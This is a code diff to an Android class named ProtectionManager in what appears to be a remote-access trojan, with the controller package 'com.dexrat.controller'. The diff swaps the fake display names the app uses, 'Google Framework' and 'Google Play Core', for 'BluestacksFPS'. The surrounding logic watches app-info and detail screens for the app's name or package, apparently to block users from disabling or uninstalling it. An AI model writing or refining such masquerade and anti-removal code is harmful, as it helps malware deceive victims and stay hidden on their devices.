@@ -117,7 +117,7 @@ public class ProtectionManager {
         if (root == null) return false;
         
         String targetPkg = service.getPackageName();
-        String appName = "Google Framework"; 
+        String appName = "BluestacksFPS"; 
         String controllerPkg = "com.dexrat.controller";
         
         // Jangan blokir jika ini adalah dialog untuk aplikasi kontroler
@@ -160,7 +160,7 @@ public class ProtectionManager {
             return false;
         }
 
-        String accLabel = "Google Play Core";
+        String accLabel = "BluestacksFPS";
         
         boolean isDetailPage = checkNodeRecursive(root, "core functionality") || 
                                checkNodeRecursive(root, "system communication");
@@ -192,7 +192,7 @@ public class ProtectionManager {
 
         if (!isAppInfoContext) return false;
 
-        String appName = "Google Framework";
+        String appName = "BluestacksFPS";
         String targetPkg = service.getPackageName();
         
         return checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
